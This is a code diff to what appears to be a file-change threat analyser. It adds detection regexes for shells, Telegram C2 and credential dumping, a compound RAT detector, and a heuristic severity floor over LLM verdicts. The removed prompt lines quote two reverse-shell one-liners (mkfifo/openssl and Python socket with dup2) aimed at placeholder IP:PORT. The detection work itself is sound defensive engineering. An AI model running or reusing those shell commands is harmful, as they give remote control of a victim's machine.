@@ -562,6 +562,12 @@ _EXECUTION_HINTS = (
     'invoke-expression', 'iex', 'powershell', '/bin/sh', 'cmd.exe',
     'setuid', 'setgid', 'chmod', 'sudo ', 'writememory',
 )
+_MODEL_FOCUS_PATTERN = re.compile(
+    r"cmd\.exe|powershell|/bin/(?:ba)?sh|/shell|createprocess|shellexecute|"
+    r"winexec|winhttp|winsock|socket|connect|sendmessage|getupdates|"
+    r"api\.telegram\.org|currentversion\\run|scheduledtask|mimikatz|lsass",
+    re.IGNORECASE,
+)
 
 _CONTEXT_SENSITIVE_CATEGORIES = {
     'priv_escalation', 'suspicious_exec', 'recon', 'c2_callback',
@@ -849,6 +855,40 @@ def _summarize_content(content: str, file_path: str) -> str:
 
 # Main Analysis Function
 
+def _select_model_content(content: str, max_chars: int = 12_000) -> str:
+    """Keep model input bounded while retaining evidence from across the file."""
+    if len(content) <= max_chars:
+        return content
+
+    candidates = list(_MODEL_FOCUS_PATTERN.finditer(content))
+
+    def match_rank(match: re.Match) -> tuple[int, int]:
+        token = match.group(0).lower()
+        decisive = {
+            "cmd.exe", "/shell", "createprocess", "shellexecute", "winexec",
+            "sendmessage", "getupdates", "api.telegram.org",
+        }
+        return (0 if token in decisive else 1, match.start())
+
+    sections = [content[:2500]]
+    ranges = [(0, 2500)]
+    for match in sorted(candidates, key=match_rank):
+        start = max(0, match.start() - 450)
+        end = min(len(content), match.end() + 650)
+        if any(start < existing_end and end > existing_start for existing_start, existing_end in ranges):
+            continue
+        label = f"\n[Focused evidence near character {match.start()}]\n"
+        section = label + content[start:end]
+        if sum(len(item) for item in sections) + len(section) > max_chars - 1200:
+            continue
+        sections.append(section)
+        ranges.append((start, end))
+
+    tail = f"\n[End of captured content]\n{content[-1000:]}"
+    sections.append(tail)
+    return "".join(sections)[:max_chars]
+
+
 def analyze_file_change(
     file_path: str,
     change_type: str,
@@ -866,11 +906,12 @@ def analyze_file_change(
     analysis dict wins. The LLM performs deep contextual reasoning;
     the heuristic engine is the lightweight floor.
     """
+    heuristic = _fallback_analysis(file_path, change_type, diff, metadata)
+
     # Build OS-aware context for the LLM
     os_context_block = _get_llm_context(file_path, change_type)
 
-    # Send up to 6000 chars of content for thorough analysis
-    content_block = diff[:6000] if diff else 'No content available'
+    content_block = _select_model_content(diff) if diff else 'No content available'
 
     baseline_note = ""
     if metadata and metadata.get("is_baseline"):
@@ -915,18 +956,21 @@ Baseline: {bool(metadata and metadata.get("is_baseline"))}
 === YOUR ANALYSIS TASKS ===
 1. IDENTIFY the threat type: Is this a reverse shell, bind shell, webshell, ransomware, cryptominer, RAT, credential theft, privilege escalation, persistence mechanism, data exfiltration, C2 callback, obfuscation, or benign?
 
-2. EXPLAIN what the content does step-by-step. For example, if it creates a named pipe, launches a shell, and tunnels through OpenSSL - explain each step and how they combine into an attack.
+2. EXPLAIN what the observed content does step-by-step and how the observed behaviors combine.
 
 3. IF the file content contains "Context-Aware Change Analysis", compare the previous content, current content, and unified diff. Base severity on the current file and newly added lines. Mention removed dangerous code as remediation, not as an active threat.
 
 4. CLASSIFY the severity accurately:
-   - A file containing "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect IP:PORT > /tmp/s" is a CRITICAL encrypted reverse shell, NOT just suspicious.
-   - A file containing "import socket; s.connect((IP,PORT)); os.dup2()" is a CRITICAL reverse shell.
-   - A normal config or log file is LOW/INFO.
+   - Weaponized remote control, shell access, credential theft, destructive behavior, or active exploitation is CRITICAL.
+   - A normal configuration, log, documentation, or routine source change is LOW/INFO unless the observed content proves otherwise.
 
 5. MAP to MITRE ATT&CK techniques (e.g., T1059.004 for command shell, T1573.002 for encrypted channel, T1071.001 for application layer protocol).
 
 6. EXTRACT IOCs: IP addresses, ports, domains, file paths used by the payload.
+
+Use only EVENT DETAILS, Platform Context, File Identity Registry Context, and
+File Content as evidence. Do not invent commands, libraries, protocols, or
+attack stages that are absent from those sections.
 
 === PRIORITY GUIDELINES ===
 - critical: Reverse shells, bind shells, webshells, ransomware, rootkits, credential dumping, active exploitation
@@ -960,9 +1004,10 @@ Return ONLY valid JSON with ALL of these keys:
             source = 'gemini'
 
     if analysis is None:
-        return _fallback_analysis(file_path, change_type, diff, metadata)
+        return heuristic
 
-    return _enrich_llm_analysis(analysis, diff, source=source or 'llm')
+    enriched = _enrich_llm_analysis(analysis, diff, source=source or 'llm')
+    return _apply_confirmed_heuristic_floor(enriched, heuristic)
 
 
 def _call_ollama(prompt_text: str) -> Optional[Dict[str, Any]]:
@@ -1017,6 +1062,10 @@ def _enrich_llm_analysis(
     if analysis.get('priority') not in valid_priorities:
         analysis['priority'] = _score_to_priority(analysis['risk_score'])
 
+    raw_threat_type = str(analysis.get('threat_type') or 'unknown')
+    canonical_threat_type = re.sub(r'[^a-z0-9]+', '_', raw_threat_type.lower()).strip('_')
+    if canonical_threat_type in THREAT_CLASSIFICATIONS or canonical_threat_type in MITRE_MAPPING:
+        analysis['threat_type'] = canonical_threat_type
     threat_type = analysis.get('threat_type', 'unknown')
     if not analysis['mitre_attack'] and threat_type in MITRE_MAPPING:
         analysis['mitre_attack'] = MITRE_MAPPING[threat_type]['techniques']
@@ -1032,6 +1081,81 @@ def _enrich_llm_analysis(
 
     analysis['analysis_source'] = source
     return analysis
+
+
+def _apply_confirmed_heuristic_floor(
+    model_analysis: Dict[str, Any],
+    heuristic: Dict[str, Any],
+) -> Dict[str, Any]:
+    """Prevent a model downgrade when static evidence confirms an attack chain."""
+    heuristic_score = int(heuristic.get("risk_score") or 0)
+    model_score = int(model_analysis.get("risk_score") or 0)
+    threat_type = str(heuristic.get("threat_type") or "")
+    findings = list(heuristic.get("findings") or [])
+    high_categories = {
+        str(item.get("category") or "")
+        for item in findings
+        if int(item.get("severity") or 0) >= 8
+    }
+    confirmed_types = {
+        "bind_shell", "credential_theft", "destructive", "process_injection",
+        "ransomware", "rat", "reverse_shell", "webshell",
+    }
+    confirmed = (
+        heuristic_score >= 9 and threat_type in confirmed_types
+    ) or (
+        heuristic_score >= 8 and len(high_categories) >= 2
+    )
+    model_is_lower = (
+        model_score < heuristic_score
+        or not bool(model_analysis.get("is_malicious"))
+        or str(model_analysis.get("threat_type") or "") in {"", "benign", "unknown"}
+    )
+    model_threat = str(model_analysis.get("threat_type") or "")
+    model_threat_key = re.sub(r"[^a-z0-9]+", "_", model_threat.lower()).strip("_")
+    model_conflicts = (
+        model_score <= heuristic_score
+        and model_threat_key not in {"", threat_type}
+    )
+    if not confirmed or not (model_is_lower or model_conflicts):
+        return model_analysis
+
+    merged = dict(model_analysis)
+    merged["model_assessment"] = {
+        "risk_score": model_score,
+        "priority": model_analysis.get("priority"),
+        "is_malicious": bool(model_analysis.get("is_malicious")),
+        "threat_type": model_analysis.get("threat_type"),
+    }
+    for key in (
+        "risk_score", "priority", "is_malicious", "threat_type",
+        "threat_classification", "mitre_attack", "mitre_tactic",
+    ):
+        merged[key] = heuristic.get(key)
+    merged["confidence"] = heuristic.get("confidence") or merged.get("confidence")
+    merged["findings"] = findings
+    merged["iocs"] = list(dict.fromkeys(
+        list(heuristic.get("iocs") or []) + list(merged.get("iocs") or [])
+    ))
+    merged["recommended_actions"] = list(dict.fromkeys(
+        list(heuristic.get("recommended_actions") or [])
+        + list(merged.get("recommended_actions") or [])
+    ))
+    conflict_note = (
+        f"The model proposed '{model_threat}', but that classification was "
+        "not supported by the corroborated static behavior chain. "
+        if model_conflicts else
+        "The model assigned a lower severity than the corroborated static behavior chain. "
+    )
+    merged["reasoning"] = (
+        "Corroborated static evidence established a higher minimum severity than "
+        "the model verdict. "
+        f"{conflict_note}{heuristic.get('reasoning', '')}"
+    ).strip()
+    merged["analysis_source"] = (
+        f"{model_analysis.get('analysis_source', 'llm')}+heuristic_floor"
+    )
+    return merged
 
 
 def _missing_reasoning(reasoning: Any) -> bool:
@@ -1103,6 +1227,59 @@ def _default_recommended_actions(score: int, threat_type: str) -> List[str]:
 
 # Heuristic Analysis Engine
 
+def _compound_behavior_findings(content: str) -> List[Dict[str, Any]]:
+    """Detect attack chains that are stronger than any single API reference."""
+    lower = content.lower()
+    remote_control = (
+        "api.telegram.org" in lower
+        and ("getupdates" in lower or "/getupdates" in lower)
+        and ("sendmessage" in lower or "/sendmessage" in lower)
+    )
+    shell_execution = (
+        "cmd.exe /c" in lower
+        and ("createprocess" in lower or "shellexecute" in lower or "winexec" in lower)
+    )
+    command_dispatch = "/shell" in lower or '"/shell "' in lower
+    hidden_execution = shell_execution and (
+        "create_no_window" in lower
+        or "sw_hide" in lower
+        or "startf_useshowwindow" in lower
+    )
+
+    findings: List[Dict[str, Any]] = []
+    if remote_control and shell_execution and command_dispatch:
+        findings.append({
+            "category": "rat",
+            "severity": 10,
+            "description": "Remote command channel combined with hidden shell execution",
+            "match_count": 3,
+            "context_sensitive": False,
+            "corroborating_behaviors": [
+                "remote_message_polling",
+                "command_dispatch",
+                "shell_process_execution",
+            ],
+        })
+    elif remote_control and shell_execution:
+        findings.append({
+            "category": "c2_callback",
+            "severity": 9,
+            "description": "Remote messaging channel combined with command execution",
+            "match_count": 2,
+            "context_sensitive": False,
+        })
+
+    if hidden_execution:
+        findings.append({
+            "category": "suspicious_exec",
+            "severity": 9,
+            "description": "Hidden command-shell process execution",
+            "match_count": 2,
+            "context_sensitive": False,
+        })
+    return findings
+
+
 def _fallback_analysis(
     file_path: str,
     change_type: str,
@@ -1128,7 +1305,8 @@ def _fallback_analysis(
 
     # -- Layer 1: Content Pattern Matching --
     if content:
-        content_to_scan = active_content[:5000]  # Scan first 5KB of active content
+        scan_limit = max(5000, int(settings.analysis_content_max_chars or 0))
+        content_to_scan = active_content[:scan_limit]
         for pattern, category, severity, description in THREAT_PATTERNS:
             matches = list(pattern.finditer(content_to_scan))
             if not matches:
@@ -1165,6 +1343,10 @@ def _fallback_analysis(
 
             findings.append(finding)
             max_score = max(max_score, adjusted_severity)
+
+        for finding in _compound_behavior_findings(content_to_scan):
+            findings.append(finding)
+            max_score = max(max_score, finding["severity"])
 
     # -- Layer 2: File Path Analysis --
     for pattern, severity, desc in HIGH_RISK_PATHS:
